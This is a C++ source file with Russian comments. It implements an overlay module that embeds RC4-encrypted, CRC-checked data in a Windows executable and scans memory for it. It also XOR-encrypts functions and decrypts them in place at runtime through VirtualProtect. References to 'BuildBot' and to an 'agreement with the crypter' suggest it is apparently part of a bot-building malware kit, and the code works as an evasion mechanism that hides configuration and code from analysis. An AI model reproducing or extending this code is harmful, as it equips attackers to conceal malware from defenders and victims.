#include <windows.h>

#include "baseoverlay.h"
#include "crypt.h"

//Обший заголовк для оверлея.
# pragma pack(push, 1)
typedef struct
{
  DWORD magicDword;  //Магический заголовок MAGIC_DWORD. Должен быть первый в стуктуре.
  DWORD crc32;       //CRC32 для (FULL_SIZE_OF_OVERLAY - &dataSize).
  WORD dataSize;     //Размер данных.
}HEADER;
# pragma pack(pop)

void BaseOverlay::init(void)
{

}

void BaseOverlay::uninit(void)
{

}

bool BaseOverlay::_loadOverlay(void *buffer, const void *overlay, LPDWORD overlaySize, const Crypt::RC4KEY *rc4Key)
{  
  if(*overlaySize < FULL_SIZE_OF_OVERLAY)return false;
  
  //Создаем копию.
  Mem::_copy(buffer, overlay, FULL_SIZE_OF_OVERLAY);
  HEADER *header = (HEADER *)buffer;
    
  //Расшифровывем.
  if(rc4Key != NULL)
  {
    Crypt::RC4KEY rc4k;
    Mem::_copy(&rc4k, rc4Key, sizeof(Crypt::RC4KEY));
    Crypt::_rc4(buffer, FULL_SIZE_OF_OVERLAY, &rc4k);
  }
  
  //Проверяем хэш.
  if(header->magicDword != MAGIC_DWORD || Crypt::crc32Hash((LPBYTE)buffer + OFFSETOF(HEADER, dataSize), FULL_SIZE_OF_OVERLAY - OFFSETOF(HEADER, dataSize)) != header->crc32 ||
     header->dataSize > FULL_SIZE_OF_OVERLAY - sizeof(HEADER))
  {
    return false;
  }
  
  //Все окей.
  *overlaySize = header->dataSize;
  Mem::_copy(buffer, (LPBYTE)buffer + sizeof(HEADER), header->dataSize);
  return true;
}

bool BaseOverlay::_createOverlay(void *overlay, const void *data, WORD dataSize, const Crypt::RC4KEY *rc4Key)
{
  if(dataSize > FULL_SIZE_OF_OVERLAY - sizeof(HEADER))return false;
  
  HEADER *header = (HEADER *)overlay;
  LPBYTE p       = (LPBYTE)overlay + sizeof(HEADER);
  
  //Заполняем оверлей.
  Mem::_copy(p, data, dataSize);
  Crypt::_generateBinaryData(p + dataSize, FULL_SIZE_OF_OVERLAY - sizeof(HEADER) - dataSize, 0x00, 0xFF, false);   
    
  //Получаем хэш.
  header->magicDword = MAGIC_DWORD;
  header->dataSize   = dataSize;
  header->crc32      = Crypt::crc32Hash((LPBYTE)overlay + OFFSETOF(HEADER, dataSize), FULL_SIZE_OF_OVERLAY - OFFSETOF(HEADER, dataSize));

  //Шифруем.
  if(rc4Key != NULL)
  {
    Crypt::RC4KEY rc4k;
    Mem::_copy(&rc4k, rc4Key, sizeof(Crypt::RC4KEY));
    Crypt::_rc4(overlay, FULL_SIZE_OF_OVERLAY, &rc4k);
  }

  return true;
}

void *BaseOverlay::_getAddress(const void *mem, DWORD size, const Crypt::RC4KEY *rc4Key)
{
#if(BO_CRYPT > 0)
  IMAGE_SECTION_HEADER *section = PeImage::_getSectionByName(mem, ".data");
  size = 512; //Договор с криптором.
  if(section->SizeOfRawData <= size)return NULL;
  return (void *)((LPBYTE)mem + section->PointerToRawData);
#else  
  if(size < FULL_SIZE_OF_OVERLAY)return NULL;

  LPBYTE p   = (LPBYTE)mem;
  LPBYTE end = p + size - FULL_SIZE_OF_OVERLAY;
  Crypt::RC4KEY rc4k;
  BYTE buffer[FULL_SIZE_OF_OVERLAY];

  //Поиск.
  for(; p <= end; p++)
  {
    DWORD magicDword = *(LPDWORD)p;
    
    //Снимем шифрование.
    if(rc4Key != NULL)
    {
      Mem::_copy(&rc4k, rc4Key, sizeof(Crypt::RC4KEY));
      Crypt::_rc4(&magicDword, sizeof(DWORD), &rc4k);
    }

    //Кажется найден заголовок.
    if(magicDword == MAGIC_DWORD)
    {
      //Ну и для 100% гарантии.
      DWORD overlaySize = FULL_SIZE_OF_OVERLAY;
      if(BaseOverlay::_loadOverlay(buffer, p, &overlaySize, rc4Key))return (void *)p;
    }
  }
  
  return NULL;
#endif
}

DWORD BaseOverlay::_encryptFunction(LPBYTE curOpcode, DWORD key)
{
  BYTE keyIndex = 0;
  DWORD opcodeSize;
  DWORD size = 0;

  while((opcodeSize = Disasm::_getOpcodeLength(curOpcode)) != (DWORD)(-1) && *curOpcode != 0xC3 && *curOpcode != 0xC2 && *curOpcode != 0xCB && *curOpcode != 0xCA)//Все виды ret для x32, x64
  {
    for(DWORD i = 0; i < opcodeSize; i++)
    {
      curOpcode[i] ^= ((LPBYTE)&key)[keyIndex];
      if(++keyIndex == sizeof(DWORD))keyIndex = 0;
    }

    curOpcode += opcodeSize;
    size += opcodeSize;
  }
  return size;
}

void __declspec(noinline)/*Для BuildBot::_run()*/ BaseOverlay::_decryptFunction(LPBYTE curOpcode, DWORD size, DWORD key)
{
  DWORD oldProtect;
  if(CWA(kernel32, VirtualProtect)(curOpcode, size, PAGE_EXECUTE_READWRITE, &oldProtect) != FALSE)
  {
    BYTE keyIndex = 0;
    for(DWORD i = 0; i < size; i++)
    {
      curOpcode[i] ^= ((LPBYTE)&key)[keyIndex];
      if(++keyIndex == sizeof(DWORD))keyIndex = 0;
    }
    CWA(kernel32, VirtualProtect)(curOpcode, size, oldProtect, &oldProtect);
  }
}
